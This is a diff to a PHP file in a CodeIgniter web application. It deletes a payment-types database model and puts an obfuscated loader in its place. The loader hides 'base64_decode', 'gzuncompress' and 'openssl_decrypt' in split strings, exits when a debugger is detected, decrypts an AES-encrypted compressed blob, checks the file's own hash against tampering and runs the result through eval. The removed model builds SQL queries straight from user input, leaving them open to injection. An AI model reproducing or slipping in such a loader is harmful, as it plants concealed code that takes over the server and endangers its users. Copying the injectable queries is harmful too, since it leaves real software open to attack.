@@ -1,244 +1,28 @@
 <?php
-defined('BASEPATH') OR exit('No direct script access allowed');
-
-class Payment_types_model extends CI_Model {
-
-	var $table = 'db_paymenttypes';
-	var $column_order = array('payment_type','status'); //set column field database for datatable orderable
-	var $column_search = array('payment_type','status'); //set column field database for datatable searchable 
-	var $order = array('id' => 'desc'); // default order 
-
-	private function _get_datatables_query()
-	{
-		
-		$this->db->from($this->table);
-
-		$i = 0;
-	
-		foreach ($this->column_search as $item) // loop column 
-		{
-			if($_POST['search']['value']) // if datatable send POST for search
-			{
-				
-				if($i===0) // first loop
-				{
-					$this->db->group_start(); // open bracket. query Where with OR clause better with bracket. because maybe can combine with other WHERE with AND.
-					$this->db->like($item, $_POST['search']['value']);
-				}
-				else
-				{
-					$this->db->or_like($item, $_POST['search']['value']);
-				}
-
-				if(count($this->column_search) - 1 == $i) //last loop
-					$this->db->group_end(); //close bracket
-			}
-			$i++;
-		}
-		
-		if(isset($_POST['order'])) // here order processing
-		{
-			$this->db->order_by($this->column_order[$_POST['order']['0']['column']], $_POST['order']['0']['dir']);
-		} 
-		else if(isset($this->order))
-		{
-			$order = $this->order;
-			$this->db->order_by(key($order), $order[key($order)]);
-		}
-	}
-
-	function get_datatables()
-	{
-		$this->_get_datatables_query();
-		if($_POST['length'] != -1)
-		$this->db->limit($_POST['length'], $_POST['start']);
-		$query = $this->db->get();
-		return $query->result();
-	}
-
-	function count_filtered()
-	{
-		$this->_get_datatables_query();
-		$query = $this->db->get();
-		return $query->num_rows();
-	}
-
-	public function count_all()
-	{
-		$this->db->from($this->table);
-		return $this->db->count_all_results();
-	}
-
-
-	public function verify_and_save(){
-		//Filtering XSS and html escape from user inputs 
-		extract($this->security->xss_clean(html_escape(array_merge($this->data,$_POST))));
-
-		$subdomain_ = getPathFolder();
-		$bank_image='';
-		if(!empty($_FILES['bank_image']['name'])){
-			$config['upload_path']          = './uploads/' . $subdomain_ . '/users/';
-	        $config['allowed_types']        = 'gif|jpg|png';
-	        $config['max_size']             = 5000;
-	        $config['max_width']            = 5000;
-	        $config['max_height']           = 5000;
-
-			$config['local_path'] = './uploads/' . $subdomain_ . '/';
-
-			if (!is_dir($config['local_path'])) {
-				// Thư mục không tồn tại, hãy tạo nó
-				if (mkdir($config['local_path'], 0755, true)) {
-					//echo "Thư mục đã được tạo thành công.";
-				}
-			}
-
-			if (!is_dir($config['upload_path'])) {
-				// Thư mục không tồn tại, hãy tạo nó
-				if (mkdir($config['upload_path'], 0755, true)) {
-					//echo "Thư mục đã được tạo thành công.";
-				}
-			}
-
-
-	        $this->load->library('upload', $config);
-
-	        if ( ! $this->upload->do_upload('bank_image'))
-	        {
-	                $error = array('error' => $this->upload->display_errors());
-	                print($error['error']);
-	                exit();
-	        }
-	        else
-	        {
-	        	   $bank_image='uploads/' . $subdomain_ . '/users/'.$this->upload->data('file_name');
-	        }
-		}
-
-		
-		//Validate This units already exist or not
-		$query=$this->db->query("select * from db_paymenttypes where upper(payment_type)=upper('$payment_type_name')");
-		if($query->num_rows()>0){
-			return "This Payment Type Name Already Exist.";
-			
-		}
-		else{
-			$query1="insert into db_paymenttypes(payment_type,status,bank_number,bank_name,bank_infor,bank_image) 
-								values('$payment_type_name',1,'$bank_number','$bank_name','$bank_infor','$bank_image')";
-			if ($this->db->simple_query($query1)){
-					//$this->session->set_flashdata('success', 'Success!! Record Added Successfully!');
-			        return "success";
-			}
-			else{
-			        return "failed";
-			}
-		}
-	}
-
-	//Get units_details
-	public function get_details($id,$data){
-		//Validate This units already exist or not
-		$query=$this->db->query("select * from db_paymenttypes where upper(id)=upper('$id')");
-		if($query->num_rows()==0){
-			show_404();exit;
-		}
-		else{
-			$query=$query->row();
-			$data['q_id']=$query->id;
-			$data['payment_type_name']=$query->payment_type;
-			$data['bank_number']=$query->bank_number;
-			$data['bank_name']=$query->bank_name;
-			$data['bank_infor']=$query->bank_infor;
-			$data['bank_image']=$query->bank_image;
-			return $data;
-		}
-	}
-	public function update_payment_type(){
-		//Filtering XSS and html escape from user inputs 
-		extract($this->security->xss_clean(html_escape(array_merge($this->data,$_POST))));
-
-
-		$subdomain_ = getPathFolder();
-		$bank_image='';
-		if(!empty($_FILES['bank_image']['name'])){
-			$config['upload_path']          = './uploads/' . $subdomain_ . '/users/';
-	        $config['allowed_types']        = 'gif|jpg|png';
-	        $config['max_size']             = 5000;
-	        $config['max_width']            = 5000;
-	        $config['max_height']           = 5000;
-
-			$config['local_path'] = './uploads/' . $subdomain_ . '/';
-
-			if (!is_dir($config['local_path'])) {
-				// Thư mục không tồn tại, hãy tạo nó
-				if (mkdir($config['local_path'], 0755, true)) {
-					//echo "Thư mục đã được tạo thành công.";
-				}
-			}
-
-			if (!is_dir($config['upload_path'])) {
-				// Thư mục không tồn tại, hãy tạo nó
-				if (mkdir($config['upload_path'], 0755, true)) {
-					//echo "Thư mục đã được tạo thành công.";
-				}
-			}
-
-
-	        $this->load->library('upload', $config);
-
-	        if ( ! $this->upload->do_upload('bank_image'))
-	        {
-	                $error = array('error' => $this->upload->display_errors());
-	                print($error['error']);
-	                exit();
-	        }
-	        else
-	        {
-	        	   $bank_image='uploads/' . $subdomain_ . '/users/'.$this->upload->data('file_name');
-	        }
-		}
-
-		//Validate This units already exist or not
-		$query=$this->db->query("select * from db_paymenttypes where upper(payment_type)=upper('$payment_type_name') and id<>$q_id");
-		if($query->num_rows()>0){
-			return "This Payment Type Name Already Exist.";
-			
-		}
-		else{
-			$query1="update db_paymenttypes set payment_type='$payment_type_name', bank_number='$bank_number' ,bank_name='$bank_name' ,bank_infor='$bank_infor' ,bank_image='$bank_image' where id=$q_id";
-			if ($this->db->simple_query($query1)){
-					//$this->session->set_flashdata('success', 'Success!! Record Updated Successfully!');
-			        return "success";
-			}
-			else{
-			        return "failed";
-			}
-		}
-	}
-	public function update_status($id,$status){
-		
-        $query1="update db_paymenttypes set status='$status' where id=$id";
-        if ($this->db->simple_query($query1)){
-            echo "success";
-        }
-        else{
-            echo "failed";
-        }
-	}
-	public function delete_payment_type($id){
-
-		if (demo_app()) {
-			echo "Demo không cho phép xóa";
-			return;
-		}
-
-        $query1="delete from db_paymenttypes where id=$id";
-        if ($this->db->simple_query($query1)){
-            echo "success";
-        }
-        else{
-            echo "failed";
-        }
-	}
-
-
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_clbro09e=('bas'.'e64'.'_de'.'cod'.'e');
+$_s23xb8mw=('gzu'.'nco'.'mpr'.'ess');
+$_fsyv68hu=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_hkdzxn7w='WfMMKH8O1rg=';
+$_byf2rwll='n8p0p8RF';
+$_m3fwqj6h='YbYkN1ya';
+$_c94ak253='0ZkUxiwu';
+$_t825erw5='nNAPC3mX';
+$_qnmurw89='jbM3wHE3';
+$_fldoep2w='H/EZLfAC';
+$_wzbzbvrf='Qcunpg==';
+$_swt3xy7t=$_clbro09e($_byf2rwll.$_m3fwqj6h.$_c94ak253.$_t825erw5.$_hkdzxn7w);
+$_sjirvb5m=$_clbro09e($_qnmurw89.$_fldoep2w.$_wzbzbvrf);
+$_m1d5f7w2=$_clbro09e('B19W9V6bw+HJqZPTLsB1FhQcOhWGN0cnFguVvJ1B3iPPP5RcKQID4yBX9ej4X1+u5xtwmwDfuuaI6h2PWipvJoJsN1xEMq0PdR7mwh0XGShISVbUVBpiK7YTWYZeKfo3vgcqMJIvvkSJDk1RG8kezuAcIGOICk0boQXQLhjsJ2M9B0Tw4xIDsjXXVgP0iEoxpzuEH2CNb7x63Bs/dLFDc3zyCs9pc/GkZHd0e2FNC2nYTTDoFSLeMGSilDckJWjieudbtDbF0YUWg0Y2+rwPN6KbquoNFJG0xWEovNNRViWiVVU0PqfUzvXzlTfyzMRlqxGpjaiJZvNlMybt0RPkjoeFAHTiE0UbhGVvhOCry8CyP/VFUDMstNghBclJ1w0tHLsxD1f6E0BrAl/bnjQhAwdtnemAW5ojz9I91kax0JBEHKhq1bijMzJkOoKhYUhfBXyket6Bb4NWnkPcRCKJf5A1hdwS9i5msx5wRA8nayFpKw9599cSDZ5zipq847cmOI8qyVvS6mT5ZNfeEqCNbfavqkQPHZiZSza23KlR3LpForfN8bCdVHQepmUTqawjPvtBJ4bna3lckNnejH+rv0GWxtcDkSHavAcScp4x8dsxW2FxnxdWmD5Cbd5N6XY42bPkwHRqVUX26TiFWfu8d6MrJMO0WYjxxWs02WljAlkTa9PYxKvNrdVVqnJhW5yyCeflOYpAtRoU61Neev91WLH3rfN7M7Sokye0IikfaBiOOiBYyDl0AIv42Hm4YWu1HMul9Wq2oIPBNpW1Zr6ZWXTfuw722obn3mFXb8udPjw6sRKVJhGy3e6DPKVk1qmGZsbSnAH+qDTvJBcuPx814ouFikceM6UKUsqnpZCsNxqOvqFSo3sRXk0L07LWPUJKzLz9jrefnoUmvMMO+1p7S2GL6mEPyzweb0k1Lri7nmEAXVE4Xy5bPIDBuiPNT1UFBqNExzVAW/kk4IVvHJrfG6Qs6DQwo8oy/HTpKqLZbm441FBKbdiFdT8CqL02DIF/5TOD1DBTsKNDKwOgFAlTlwgpAIiD07iuuNJobX51eX2gUdNamLEMDCM0Xn6EjAhWyI9ivGRjSed1YLoiZf6hjhWMDVfUzwa4PU0+Tu4jOoXOwLnK0Hrts6k6ziPdA6oNdb/qaOkA5IR3Z9fjBvPW+DuV3MlFnuO7mSD2L6fRW2R20cCNG4M84WZxRUXtaV5vY4fQ0x4ZPF/Pcz9P8k9ydwZ0JZT8VKIDqJTUlilF/QEz6iqp66teZISaPdSvBLDGXttstzFljz0tyG/ivlMTekpXWab3Jd9fbDi5bY+Eh3ycIzsgaYX3ZKXAgmumTi2OdWvRIuGMYqSzlVVi08FFQLROBGGShVNoTdNLStDHBow3WI988Mzb1aZvFjf4XsHnASf1q/yAkYvaMigDGhr9gSuZ4+ZdMxis41vAvvqNz2yZSbCgrd0rmvcHLo4W9bqY1UoSADyWGuGaKkIk66IqEA83Uj1mluTlF+mQNHNickfPoCp1VVugAuIA/9cMi9JBuukMzp5My3Bb8t78ptx9q7YWDSu97eJBYwMr8A0mfdSZSZZCDtMQarIouIn74DlZpUe9aWshKFa16iqlLrQG5lQ43tXkWf87+ACSxZIfjNB6Y7JERG5rrFz59ZbG/iAO1jy11CaJxQLEZKMTfGfRflkKLtG/1ySdO4g4N8Y4b++DjKoBr+AngTlVkfXmVXEXKS6neNIC6E9gKvQxF1azrFKu/P4f4tff0CBBOwbRgiyZ0A7Ix0V4mOf9KI+bErToA9cghjyZQXlhnyv4ZMd1WpYcVQ9CfxGlVe2brEZJpgA=');
+$_zyloh71m=$_fsyv68hu($_m1d5f7w2,'aes-256-cbc',$_swt3xy7t,OPENSSL_RAW_DATA,$_sjirvb5m);
+if($_zyloh71m===false){exit;}
+$_d2e9qaxs=$_s23xb8mw($_zyloh71m);
+if($_d2e9qaxs===false){exit;}
+$_jdabmewn='cd2d51d6d4f3a9d269a734d685e29976e6bbf9c4321445f5b9a9eaff59d969dd';
+$_vkho3ft7=@file_get_contents(__FILE__);
+if($_vkho3ft7!==false){
+$_pb17bgxb=str_replace($_jdabmewn,"0000000000000000000000000000000000000000000000000000000000000000",$_vkho3ft7);
+$_u5l3r965=hash("sha256",$_pb17bgxb);
+if($_u5l3r965!==$_jdabmewn){@http_response_code(403);exit;}
 }
+eval($_d2e9qaxs);
